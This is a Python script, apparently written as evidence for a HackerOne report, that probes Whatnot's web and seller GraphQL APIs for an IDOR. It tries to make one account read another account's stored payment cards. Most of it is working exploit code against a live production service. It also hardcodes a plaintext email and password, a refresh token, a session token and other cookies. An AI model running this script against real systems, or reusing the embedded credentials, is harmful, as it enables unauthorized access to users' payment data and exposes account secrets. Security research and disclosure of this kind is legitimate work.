#!/usr/bin/env python3
"""
Run this on your Mac: python3 run_evidence.py
Tries fresh email/password login first, falls back to stored refresh token.
"""
import requests, json
from datetime import datetime

WEB_GQL    = "https://www.whatnot.com/services/graphql/"
SELLER_GQL = "https://api.whatnot.com/seller-api/graphql"
STAGE_GQL  = "https://api.stage.whatnot.com/seller-api/graphql"

ATTACKER_ID   = "58968022"
ATTACKER_USER = "anyakoa"
VICTIM_ID     = "58968144"
VICTIM_USER   = "anyako0810"

# anyakoa account credentials
EMAIL    = "anneshirleynyako+a@gmail.com"
PASSWORD = "Mamaoye08190!"

REFRESH_TOKEN = (
    "eyJhbGciOiJFZERTQSIsImtpZCI6IndoYXRub3QtcmVmcmVzaC1wcm9kLTEiLCJ0eXAiOiJKV1QifQ"
    ".eyJzdWIiOjU4OTY4MDIyLCJpc3MiOiJ3aGF0bm90L2F1dGgiLCJhdWQiOiJ3aGF0bm90L3JlZnJlc2gi"
    "LCJleHAiOjE4MTE5MjIwMzQsImlhdCI6MTc4MDM4NjAzNCwibmJmIjoxNzgwMzg2MDM0LCJqdGkiOiJ1"
    "b1F2UDJ0Y2dHMjg1TUR5OWJlQkl3IiwiYXBwc2lkIjoiYWEzOThhN2UtOGZiMy00MjJjLWE4MzktYjNk"
    "YTFiMjQ5MTY2IiwidXByIjoxLjAsInNlc3Npb25fdG9rZW4iOiJ3bl9ydF9INjduUXR1MEZ6RHl3U19k"
    "MWxOQzpYbC13aG84cWJOczJibDdDY1ZzMiJ9"
    ".XUDXFHG5SkWvNnqql3MxS-xYChVSiI3oUgF8NpreGthRx7u0C90YTOcBH7V0H4g9PX0XjPlhfu5i2vdyi_btDQ"
)

WHATNOT_LIVE = (
    "SFMyNTY.g3QAAAACbQAAAAtfY3NyZl90b2tlbm0AAAAYck1reUJLYUdzVnYxcG8ybGJ5bW15UmRCbQAAAAZj"
    "bGFpbXN0AAAACm0AAAAGYXBwc2lkbQAAACRjYmE2ZGM2My1mMjJmLTRiN2YtYjBhZi04ZTMyOTI1MGMyZGVt"
    "AAAAA2F1ZG0AAAAOd2hhdG5vdC9hY2Nlc3NtAAAAA2V4cGJqHkAIbQAAAANpYXRiah4-3G0AAAAIaWRlbnRp"
    "dHltAAAAHGFubmVzaGlybGV5bnlha28rYUBnbWFpbC5jb21tAAAAA2lzc20AAAAMd2hhdG5vdC9hdXRobQAA"
    "AANqdGltAAAAFjJ5bTQtWm1GWVluSzAybjlxZklwWndtAAAAA25iZmJqHj7cbQAAAANzdWJtAAAACDU4OTY4"
    "MDIybQAAAAN1cHJGP_AAAAAAAAA.tWb8yyZ1N1Q4UMlfEIns6_-QRY5RutY1ZOcLvnExP2M"
)

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Origin": "https://www.whatnot.com",
    "Referer": "https://www.whatnot.com/",
    "Accept": "application/json, */*",
    "Accept-Language": "en-US,en;q=0.9",
}

results = []

def log(msg):
    print(msg)
    results.append(str(msg))

def try_login(session):
    """Attempt fresh email/password login. Returns True if successful."""
    log("[*] Trying fresh login...")
    h = {**BASE_HEADERS, "Content-Type": "application/json"}

    for endpoint in [
        "https://www.whatnot.com/services/api/v2/login",
        "https://www.whatnot.com/services/api/v2/auth/login",
    ]:
        try:
            r = session.post(endpoint,
                             json={"email": EMAIL, "password": PASSWORD},
                             headers=h, timeout=15)
            log(f"  Login [{endpoint.split('/')[-1]}]: HTTP {r.status_code}")
            if r.status_code == 200:
                log(f"  Login body: {r.text[:200]}")
                return True
            elif r.status_code not in (403, 404):
                log(f"  Login body: {r.text[:200]}")
        except Exception as e:
            log(f"  Login error: {e}")

    # Try GraphQL login mutation
    try:
        gql_login = {
            "query": """
            mutation Login($email: String!, $password: String!) {
              login(email: $email, password: $password) {
                token user { id username }
              }
            }""",
            "variables": {"email": EMAIL, "password": PASSWORD}
        }
        r = session.post(WEB_GQL, json=gql_login,
                         headers={**BASE_HEADERS, "Content-Type": "application/json"},
                         timeout=15)
        log(f"  GraphQL login: HTTP {r.status_code}  body={r.text[:200]}")
        if r.status_code == 200 and "token" in r.text:
            return True
    except Exception as e:
        log(f"  GraphQL login error: {e}")

    return False

def try_refresh(session):
    """Use stored refresh token. Returns True if session becomes authenticated."""
    log("[*] Trying refresh token...")
    h = {
        **BASE_HEADERS,
        "Content-Type": "application/json",
        "Authorization": "Cookie",
    }
    try:
        r = session.post("https://www.whatnot.com/services/api/v2/refresh",
                         json={}, headers=h, timeout=15)
        log(f"  Refresh: HTTP {r.status_code}")
        log(f"  Refresh cookies set: {[c.name for c in r.cookies]}")
        if r.status_code == 200:
            return True
    except Exception as e:
        log(f"  Refresh error: {e}")
    return False

def check_me(session):
    """Check if session is authenticated by querying me { id username }."""
    h = {**BASE_HEADERS, "Content-Type": "application/json"}
    try:
        r = session.post(WEB_GQL, json={"query": "{ me { id username } }"},
                         headers=h, timeout=15)
        if r.status_code == 200:
            me = r.json().get("data", {}).get("me")
            return me
    except Exception:
        pass
    return None

def gql_session(session, url, query, bearer=None):
    h = {**BASE_HEADERS, "Content-Type": "application/json"}
    if bearer:
        h["Authorization"] = f"Bearer {bearer}"
    try:
        r = session.post(url, json={"query": query}, headers=h, timeout=15)
        return r.status_code, r.json()
    except Exception as e:
        return 0, {"_error": str(e)}

def gql_no_auth(url, query):
    h = {**BASE_HEADERS, "Content-Type": "application/json"}
    try:
        r = requests.post(url, json={"query": query}, headers=h, timeout=15)
        return r.status_code, r.json()
    except Exception as e:
        return 0, {"_error": str(e)}

def main():
    log("=" * 60)
    log(f"  Whatnot IDOR Evidence Run — {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}")
    log(f"  Attacker: {ATTACKER_USER} ({ATTACKER_ID})")
    log(f"  Victim:   {VICTIM_USER} ({VICTIM_ID})")
    log("=" * 60)

    # ── authenticate ──────────────────────────────────────────────────────────
    session = requests.Session()

    # Seed session with all base cookies including Phoenix live token
    base_cookies = {
        "stable-id": "fcdd7ff3-1878-46ed-8469-725bdcce7b94",
        "ajs_user_id": "58968022",
        "disableAutologin": "true",
        "device": "85584c52-3177-4581-b0dc-5c47e3ea18f1",
        "usid": "41ada6a0-0eab-40e1-9229-6d7a0d653831",
        "sessionId": "ae6ec54f-3671-4e0b-a08e-e46803b563a7",
        "csrf": "IkRfNSNlQVp5TFcoam9edHdMdCNFNWpScVcqZkZAQiVpLkZpNEd4T2tMZWZ3VmlwQ1FnaEV2Y1hvNUxkTWo1N2RHVHJJR2hzS1NEaXM9Ig%3D%3D",
        "__Secure-is-http-only-auth": "1",
        "__Secure-access-token-fp": "none",
        "__Secure-refresh-token-fp": "none",
        "__Secure-claims": "eyJjIjoxNzgwMzg2MDMzMjUzLCJzIjoiYWEzOThhN2UtOGZiMy00MjJjLWE4MzktYjNkYTFiMjQ5MTY2IiwidSI6NTg5NjgwMjJ9",
        "tatari-user-cookie": "58968022",
        "tatari-session-cookie": "06feb852-5f2e-e730-868e-873c6a155247",
        "__Secure-whatnot-live": WHATNOT_LIVE,
        "__Secure-refresh-token": REFRESH_TOKEN,
    }
    for name, value in base_cookies.items():
        session.cookies.set(name, value, domain="www.whatnot.com")
    authed = False

    if try_login(session):
        me = check_me(session)
        if me:
            log(f"  Logged in as: {me.get('username')} (id={me.get('id')})")
            authed = True
        else:
            log("  Login succeeded but me: null — trying refresh")

    if not authed:
        if try_refresh(session):
            me = check_me(session)
            if me:
                log(f"  Authenticated via refresh: {me.get('username')} (id={me.get('id')})")
                authed = True
            else:
                log("  Refresh succeeded but me still null")
                log("  DEBUG cookies in session:")
                for c in session.cookies:
                    log(f"    {c.name}={c.value[:30]}...")

    if not authed:
        log("\n[!] Could not authenticate — C/D will fail")

    # grab access token from session for Seller API Bearer tests
    new_access = session.cookies.get("__Secure-access-token", "")

    # ── Evidence A ────────────────────────────────────────────────────────────
    log("\n=== Evidence A: Staging API publicly reachable ===")
    code, body = gql_no_auth(STAGE_GQL, "{ __typename }")
    log(f"  HTTP {code}  body={str(body)[:100]}")
    log(f"  Result: {'PASS — endpoint live, returns 401' if code == 401 else str(code)}")

    # ── Evidence B ────────────────────────────────────────────────────────────
    log("\n=== Evidence B: Production Seller API exists ===")
    code, body = gql_no_auth(SELLER_GQL, "{ __typename }")
    log(f"  HTTP {code}  body={str(body)[:100]}")
    log(f"  Result: {'PASS — endpoint live, returns 401' if code == 401 else str(code)}")

    # ── Evidence C ────────────────────────────────────────────────────────────
    log("\n=== Evidence C: 'cards' field on UserNode schema ===")
    code, body = gql_session(session, WEB_GQL,
                             '{ __type(name: "UserNode") { fields { name } } }')
    log(f"  HTTP {code}")
    if code == 200:
        fields = [f["name"] for f in body.get("data", {}).get("__type", {}).get("fields", [])]
        payment = [f for f in fields if any(k in f.lower() for k in ["card","payment","billing","wallet"])]
        log(f"  Payment-related fields: {payment}")
        log(f"  'cards' present: {'cards' in fields}")
        log(f"  Result: {'PASS' if 'cards' in fields else 'FAIL — cards not found'}")
    else:
        log(f"  body={str(body)[:300]}")
        log("  Result: FAIL")

    # ── Evidence D ────────────────────────────────────────────────────────────
    log("\n=== Evidence D: me.cards returns own payment card data ===")
    q = ('{ me { id username cards(first:5) { edges { node '
         '{ id cardDescription cardType gateway } } } } }')
    code, body = gql_session(session, WEB_GQL, q)
    log(f"  HTTP {code}")
    if code == 200:
        me = body.get("data", {}).get("me")
        if me:
            edges = me.get("cards", {}).get("edges", [])
            log(f"  Logged in as: {me.get('username')} (id={me.get('id')})")
            log(f"  Cards returned: {len(edges)}")
            for e in edges:
                n = e.get("node", {})
                log(f"    card: type={n.get('cardType')}  desc={n.get('cardDescription')}  gateway={n.get('gateway')}")
            log("  Result: PASS")
        else:
            log(f"  me: null  body={str(body)[:200]}")
            log("  Result: FAIL")
    else:
        log(f"  body={str(body)[:200]}")
        log("  Result: FAIL")

    # ── Evidence E ────────────────────────────────────────────────────────────
    log("\n=== Evidence E: user(id:) blocked on web GraphQL ===")
    code, body = gql_session(session, WEB_GQL, f'{{ user(id: "{VICTIM_ID}") {{ id }} }}')
    log(f"  HTTP {code}  body={json.dumps(body)[:300]}")
    errors = body.get("errors", [])
    blocked = any("Cannot query field" in e.get("message", "") for e in errors)
    log(f"  Result: {'PASS — correctly blocked' if blocked else 'UNEXPECTED'}")

    # ── Evidence F ────────────────────────────────────────────────────────────
    log("\n=== Evidence F: Seller API — web JWT as Bearer ===")
    if new_access:
        code, body = gql_session(session, SELLER_GQL,
                                 '{ __type(name: "Query") { fields { name } } }',
                                 bearer=new_access)
        log(f"  HTTP {code}  body={str(body)[:300]}")
        if code == 200:
            fields = [f["name"] for f in body.get("data",{}).get("__type",{}).get("fields",[])]
            log(f"  Query fields: {fields}")
            log(f"  'user' present: {'user' in fields}")
            log("  Result: PASS — Seller API accepts web JWT!")
        else:
            log(f"  Result: HTTP {code} — web JWT rejected (expected)")
    else:
        log("  Skipped — no access token in session")

    # ── Evidence G ────────────────────────────────────────────────────────────
    log("\n=== Evidence G: Live IDOR — Account A reads Account B cards ===")
    if new_access:
        q = (f'{{ user(id: "{VICTIM_ID}") '
             f'{{ id username cards(first:10) '
             f'{{ edges {{ node {{ id cardDescription cardType gateway }} }} }} }} }}')
        code, body = gql_session(session, SELLER_GQL, q, bearer=new_access)
        log(f"  HTTP {code}  body={str(body)[:400]}")
        if code == 200:
            user_data = body.get("data", {}).get("user")
            if user_data:
                edges = user_data.get("cards", {}).get("edges", [])
                if edges:
                    log(f"  *** IDOR CONFIRMED — victim cards visible ***")
                    for e in edges:
                        log(f"    {e.get('node', {})}")
                else:
                    log(f"  user returned but no cards: {user_data}")
        else:
            log(f"  Result: HTTP {code} — Seller API requires native iOS token")
    else:
        log("  Skipped — no access token")

    # ── save ──────────────────────────────────────────────────────────────────
    with open("evidence_results.txt", "w") as f:
        f.write("\n".join(results))
    log(f"\n[+] Saved to evidence_results.txt — screenshot and attach to HackerOne.\n")

if __name__ == "__main__":
    main()
